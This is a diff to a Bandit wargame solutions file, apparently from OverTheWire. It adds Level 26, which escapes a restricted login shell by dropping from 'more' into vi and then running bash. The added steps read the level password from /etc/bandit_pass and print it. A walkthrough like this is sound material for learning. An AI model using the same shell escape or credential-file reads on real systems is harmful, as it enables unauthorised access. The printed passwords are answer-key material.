@@ -293,3 +293,25 @@ Wrong! Please enter the correct pincode. Try again.
 Correct!
 The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
 ```
+
+## Level 26
+Find the program being used as `bandit26`'s login shell.
+```
+$ getent passwd bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+`more` can launch `vi` which can launch `bash`. Resize the terminal window so that `more` stays in interactive mode and `ssh`, then escape to a real shell and read the password.
+```
+$ ssh bandit26@localhost -i bandit26.sshkey
+v
+:!/bin/bash
+$ cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
